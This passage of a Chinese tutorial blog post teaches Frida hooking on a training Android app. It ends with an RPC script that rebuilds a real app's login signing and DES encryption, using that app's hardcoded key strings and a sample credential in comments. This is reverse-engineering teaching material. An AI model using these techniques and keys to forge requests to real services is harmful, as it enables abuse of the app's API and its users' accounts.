class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改类的字段</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态字段的修改</span></span><br><span class="line">        <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">        money.<span class="property">flag</span>.<span class="property">value</span> = <span class="string">&quot;zxk1ng&quot;</span>;  <span class="comment">//修改静态字段用.value。 money.flag被frida封装为对象</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(money.<span class="property">flag</span>.<span class="property">value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非静态字段的修改</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;  <span class="comment">//每次找到一个对象就会调用这个函数</span></span><br><span class="line">                obj.<span class="property">_name</span>.<span class="property">value</span> = <span class="string">&quot;ouyuan&quot;</span>; <span class="comment">//字段名与函数名相同 前面加个下划线</span></span><br><span class="line">                obj.<span class="property">num</span>.<span class="property">value</span> = <span class="number">888</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hooktest5</span>();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hook内部类与匿名类"><a href="#Hook内部类与匿名类" class="headerlink" title="Hook内部类与匿名类"></a>Hook内部类与匿名类</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook匿名类  在匿名类前面 + ‘$’</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money$innerClass&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(innerClass);</span></span><br><span class="line">        innerClass.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            a = <span class="string">&quot;jingyi&quot;</span>;</span><br><span class="line">            b = <span class="number">666</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> xxx = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.MainActivity$1&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(xxx);</span></span><br><span class="line">        xxx.<span class="property">getInfo</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;匿名类被Hook了&quot;</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如何定位匿名函数位置：看匿名类的外部类，在smali代码中搜索 外部类$1/2/3...</span></span><br></pre></td></tr></table></figure><h2 id="Hook参数是对象的情况"><a href="#Hook参数是对象的情况" class="headerlink" title="Hook参数是对象的情况"></a>Hook参数是对象的情况</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>();  <span class="comment">//主动调用</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line"></span><br><span class="line">        retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>(<span class="number">111</span>);  <span class="comment">//主动调用</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Money</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Money&#x27;</span>);</span><br><span class="line">        retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>(<span class="title class_">Money</span>.$new(<span class="string">&#x27;zxk1ng&#x27;</span>,<span class="number">888</span>));   <span class="comment">//主动调用</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_">hooktest6</span>();</span><br></pre></td></tr></table></figure><h2 id="枚举已经加载的所有类与枚举类的所有方法"><a href="#枚举已经加载的所有类与枚举类的所有方法" class="headerlink" title="枚举已经加载的所有类与枚举类的所有方法"></a>枚举已经加载的所有类与枚举类的所有方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//枚举已加载的所有类与枚举类的所有方法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Java.enumerateLoadedClasses(&#123;   回调</span></span><br><span class="line">        <span class="comment">//     onMatch: function(name, handle)&#123;</span></span><br><span class="line">        <span class="comment">//         if(name.indexOf(&quot;com.xiaojianbang.app&quot;) != -1)&#123;</span></span><br><span class="line">        <span class="comment">//             console.log(name);</span></span><br><span class="line">        <span class="comment">//             var clazz = Java.use(name);</span></span><br><span class="line">        <span class="comment">//             console.log(clazz);</span></span><br><span class="line">        <span class="comment">//             var methods = clazz.class.getDeclaredMethods();</span></span><br><span class="line">                    </span><br><span class="line">        <span class="comment">//             for(var i = 0; i &lt; methods.length; i++)&#123;</span></span><br><span class="line">        <span class="comment">//                 console.log(methods[i]);</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">                </span><br><span class="line">        <span class="comment">//     &#125;,</span></span><br><span class="line">        <span class="comment">//     onComplete: function()&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> classes = <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClassesSync</span>(); <span class="comment">//找到所有类存在classes</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classes.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(classes[i].<span class="title function_">indexOf</span>(<span class="string">&quot;com.xiaojianbang.app&quot;</span>) != -<span class="number">1</span>)&#123;  <span class="comment">//找某个包</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(classes[i]);</span><br><span class="line">                <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(classes[i]);</span><br><span class="line">                <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.类的字节码</span></span><br><span class="line"><span class="comment">//  Class.forName(&#x27;com.xiaojianbang.app.xxxx&#x27;)</span></span><br><span class="line"><span class="comment">//  obj.getClass</span></span><br><span class="line"><span class="comment">//  xxxx.class</span></span><br><span class="line"><span class="comment">//getDeclaredMethods  获得所有方法 getMethods 获得public的方法</span></span><br></pre></td></tr></table></figure><h2 id="Hook类的所有方法"><a href="#Hook类的所有方法" class="headerlink" title="Hook类的所有方法"></a>Hook类的所有方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hookAll</span>(<span class="params">md5, methodName</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; md5[methodName].<span class="property">overloads</span>.<span class="property">length</span>; k++)&#123;</span><br><span class="line">            md5[methodName].<span class="property">overloads</span>[k].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>[methodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> md5 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.MD5&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> methods = md5.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">            <span class="title function_">hookAll</span>(md5, methodName)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook动态加载的dex"><a href="#Hook动态加载的dex" class="headerlink" title="Hook动态加载的dex"></a>Hook动态加载的dex</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hook动态加载的dex</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest9</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//安卓7.0以上才可以用</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">loadClass</span>(<span class="string">&quot;com.xiaojianbang.app.Dynamic&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader; <span class="comment">//使用其他classloader加载类</span></span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Dynamic</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Dynamic&quot;</span>);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dynamic</span>);</span><br><span class="line">                        <span class="title class_">Dynamic</span>.<span class="property">sayHello</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="string">&quot;jingyi&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hookTest9</span>();</span><br></pre></td></tr></table></figure><h2 id="map类型遍历与修改"><a href="#map类型遍历与修改" class="headerlink" title="map类型遍历与修改"></a>map类型遍历与修改</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest10</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ShufferMap</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.ShufferMap&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(ShufferMap);</span></span><br><span class="line">        <span class="title class_">ShufferMap</span>.<span class="property">show</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">map</span>)&#123;</span><br><span class="line">            <span class="comment">//console.log(JSON.stringify(map));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//Java map的遍历</span></span><br><span class="line">            <span class="keyword">var</span> key = map.<span class="title function_">keySet</span>();</span><br><span class="line">            <span class="keyword">var</span> it = key.<span class="title function_">iterator</span>();</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(it.<span class="title function_">hasNext</span>())&#123;</span><br><span class="line">                <span class="keyword">var</span>  keystr = it.<span class="title function_">next</span>();</span><br><span class="line">                <span class="keyword">var</span>  valuestr = map.<span class="title function_">get</span>(keystr);</span><br><span class="line">                result += valuestr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// map.put(&quot;pass&quot;, &quot;jingyi&quot;);</span></span><br><span class="line">            <span class="comment">// map.put(&quot;guanwang&quot;, &quot;bbs.125.la&quot;);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// var retval = this.show(map);</span></span><br><span class="line">            <span class="comment">// console.log(retval);</span></span><br><span class="line">            <span class="comment">// return retval;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook主动调用"><a href="#Hook主动调用" class="headerlink" title="Hook主动调用"></a>Hook主动调用</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest11</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态方法的主动调用</span></span><br><span class="line">        <span class="keyword">var</span> str = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> bytes = str.$new(<span class="string">&quot;xiaojianbang&quot;</span>).<span class="title function_">getBytes</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> rsa = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.RSA&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> retval = rsa.<span class="title function_">encrypt</span>(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> base64 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Base64&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> result = base64.<span class="title function_">encodeToString</span>(retval, <span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非静态方法的主动调用1 (新建一个对象去调用)</span></span><br><span class="line">        <span class="keyword">var</span> res = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>).$new(<span class="string">&quot;日元&quot;</span>, <span class="number">300000</span>).<span class="title function_">getInfo</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Utils&quot;</span>);</span><br><span class="line">        res = utils.$new().<span class="title function_">myPrint</span>([<span class="string">&quot;xiaojianbang&quot;</span>, <span class="string">&quot;is very good&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;jingyi&quot;</span>, <span class="string">&quot;is very good&quot;</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非静态方法的主动调用2 (获取已有的对象调用)</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(obj.<span class="property">_name</span>.<span class="property">value</span> == <span class="string">&quot;日元&quot;</span>)&#123;</span><br><span class="line">                    res = obj.<span class="title function_">getInfo</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="frida实现rpc"><a href="#frida实现rpc" class="headerlink" title="frida实现rpc"></a>frida实现rpc</h2><ul><li>xjb第22课时</li><li>demo为第九课的嘟嘟牛</li><li>前置：了解了app关键算法</li></ul><ol><li><p>登录嘟嘟牛，同时使用charles进行抓包<img src="2025-01-15-frida与Objection/image-20231126143811910.png" alt="image-20231126143811910"></p></li><li><p>发现关键输出Encrypt，使用frida的自吐算法脚本进行测试<br>命令 <code>frida -UF -l  frida_zitu.js com.dodonew.online</code></p><p>得到一堆数据，用charles抓到的包的数据在进行索引，如 ‘NIszaqFPos1vd0pFqKlB42Np5itPxaNH’</p><p>到如下位置<img src="2025-01-15-frida与Objection/image-20231126143647286.png" alt="image-20231126143647286">可知这个app算法 doFinal结果如上图，向上可找到传进去的参数 doFinal参数</p><p>有个sig n，通过第九课的学习知道这个sign是通过app的关键函数md5加密而来，所以索引这个sign值看一下那个md5函数的参数<img src="2025-01-15-frida与Objection/image-20231126144005343.png" alt="image-20231126144005343">如上图找到了参数</p><p>知道了两个关键函数RequestUtil.encodeDesMap和Utils.md5的参数和返回结果，可以写一个frida的rpc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jsCode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function fridarpc(username,passward)&#123;</span></span><br><span class="line"><span class="string">    var result;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var time = new Date().getTime(); //获得timeStamp时间戳</span></span><br><span class="line"><span class="string">        //time = &#x27;1700980477428&#x27;;</span></span><br><span class="line"><span class="string">        //var passward = &#x27;930516iu&#x27;;</span></span><br><span class="line"><span class="string">        //var username = &#x27;13785674926&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var string =Java.use(&quot;java.lang.String&quot;);</span></span><br><span class="line"><span class="string">        var signData = string.$new(&#x27;equtype=ANDROID&amp;loginImei=Android352530080139520&amp;timeStamp=&#x27; + </span></span><br><span class="line"><span class="string">        time + &#x27;&amp;userPwd=&#x27; + passward +&#x27;&amp;username=&#x27;+ username +&#x27;&amp;key=sdlkjsdljf0j2fsjk&#x27;);</span></span><br><span class="line"><span class="string">        var utils = Java.use(&#x27;com.dodonew.online.util.Utils&#x27;);  //md5</span></span><br><span class="line"><span class="string">        var sign = utils.md5(signData).toUpperCase();</span></span><br><span class="line"><span class="string">        console.log(&quot;sign：&quot;,sign);  //输出sign值</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        var requestUtil = Java.use(&#x27;com.dodonew.online.http.RequestUtil&#x27;);  //加密</span></span><br><span class="line"><span class="string">        var encryptDate = &#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352530080139520&quot;,&quot;sign&quot;:&quot;&#x27;+ </span></span><br><span class="line"><span class="string">        sign +&#x27;&quot;,&quot;timeStamp&quot;:&quot;&#x27;+ time +&#x27;&quot;,&quot;userPwd&quot;:&quot;&#x27;+ passward +&#x27;&quot;,&quot;username&quot;:&quot;&#x27;+ username +&#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        var Encrypt = requestUtil.encodeDesMap(encryptDate,&#x27;65102933&#x27;,&#x27;32028092&#x27;);</span></span><br><span class="line"><span class="string">        console.log(&quot;Encrypt：&quot;,Encrypt);</span></span><br><span class="line"><span class="string">        result = Encrypt;  </span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    return result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">rpc.exports=&#123;</span></span><br><span class="line"><span class="string">    zxk1ng:fridarpc</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用frida脚本</span></span><br><span class="line">process = frida.get_device_manager().add_remote_device(<span class="string">&#x27;192.168.100.83:27042&#x27;</span>).attach(<span class="string">&quot;com.dodonew.online&quot;</span>)</span><br><span class="line">script = process.create_script(jsCode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Running 小肩膀&#x27;</span>)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">app = 